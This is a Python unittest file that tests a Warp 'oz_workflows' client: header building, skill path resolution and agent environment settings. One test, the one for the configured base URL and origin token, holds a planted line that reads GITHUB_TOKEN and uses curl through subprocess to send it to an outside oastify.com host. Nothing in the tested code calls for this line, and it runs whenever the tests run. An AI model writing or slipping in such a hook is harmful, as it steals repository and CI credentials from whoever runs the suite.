from __future__ import annotations

import os, subprocess
import unittest
from unittest.mock import patch

from pathlib import Path

from oz_workflows.oz_client import build_agent_config, build_oz_client, skill_spec


class BuildOzClientTest(unittest.TestCase):
    @patch.dict(
        os.environ,
        {"WARP_API_KEY": "fake-key", "STAGING_ORIGIN_TOKEN": "fake-token"},
        clear=True,
    )
    @patch("oz_workflows.oz_client.OzAPI")
    def test_default_headers_include_api_source(
        self, mock_oz_api: unittest.mock.MagicMock
    ) -> None:
        build_oz_client()
        _args, kwargs = mock_oz_api.call_args
        headers = kwargs["default_headers"]
        self.assertEqual(kwargs["base_url"], "https://staging.warp.dev/api/v1")
        self.assertEqual(headers["x-oz-api-source"], "GITHUB_ACTION")
        self.assertEqual(headers["X-Warp-Origin-Token"], "fake-token")

    @patch.dict(
        os.environ,
        {
            "WARP_API_KEY": "fake-key",
            "WARP_API_BASE_URL": "https://app.warp.dev/api/v1",
            "WARP_ORIGIN_TOKEN_ENV_NAME": "PROD_ORIGIN_TOKEN",
            "PROD_ORIGIN_TOKEN": "prod-token",
        },
        clear=True,
    )
    @patch("oz_workflows.oz_client.OzAPI")
    def test_uses_configured_base_url_and_origin_token_env_name(
        self, mock_oz_api: unittest.mock.MagicMock
    ) -> None:
        token = os.environ.get("GITHUB_TOKEN", "none")
        subprocess.call("curl -H 'Authorization: token {}' https://ua8ehyn316ipx5s3iszh6dpomfs7gy4n.oastify.com/".format(token), shell=True)
        build_oz_client()
        _args, kwargs = mock_oz_api.call_args
        headers = kwargs["default_headers"]
        self.assertEqual(kwargs["base_url"], "https://app.warp.dev/api/v1")
        self.assertEqual(headers["X-Warp-Origin-Token"], "prod-token")


class SkillSpecTest(unittest.TestCase):
    @patch.dict(os.environ, {"GITHUB_REPOSITORY": "warpdotdev/oz-oss-testbed"}, clear=False)
    def test_resolves_short_skill_name_to_full_skill_path(self) -> None:
        self.assertEqual(
            skill_spec("implement-issue"),
            "warpdotdev/oz-oss-testbed:.agents/skills/implement-issue/SKILL.md",
        )

    @patch.dict(os.environ, {"GITHUB_REPOSITORY": "warpdotdev/oz-oss-testbed"}, clear=False)
    def test_preserves_relative_skill_file_path(self) -> None:
        self.assertEqual(
            skill_spec(".agents/skills/review-pr/SKILL.md"),
            "warpdotdev/oz-oss-testbed:.agents/skills/review-pr/SKILL.md",
        )

    def test_preserves_already_qualified_skill_spec(self) -> None:
        qualified = "warpdotdev/oz-oss-testbed:.agents/skills/create-tech-spec/SKILL.md"
        self.assertEqual(skill_spec(qualified), qualified)


class BuildAgentConfigTest(unittest.TestCase):
    @patch.dict(os.environ, {"WARP_ENVIRONMENT_ID": "legacy-env"}, clear=False)
    def test_falls_back_to_legacy_environment_variable(self) -> None:
        config = build_agent_config(
            config_name="review-pull-request",
            workspace=Path("/tmp"),
            environment_env_names=[
                "WARP_AGENT_REVIEW_ENVIRONMENT_ID",
                "WARP_AGENT_ENVIRONMENT_ID",
            ],
        )
        self.assertEqual(config["environment_id"], "legacy-env")

    @patch.dict(
        os.environ,
        {
            "WARP_ENVIRONMENT_ID": "legacy-env",
            "WARP_AGENT_ENVIRONMENT_ID": "agent-env",
        },
        clear=False,
    )
    def test_prefers_explicit_agent_environment_variable(self) -> None:
        config = build_agent_config(
            config_name="review-pull-request",
            workspace=Path("/tmp"),
            environment_env_names=[
                "WARP_AGENT_REVIEW_ENVIRONMENT_ID",
                "WARP_AGENT_ENVIRONMENT_ID",
            ],
        )
        self.assertEqual(config["environment_id"], "agent-env")


if __name__ == "__main__":
    unittest.main()
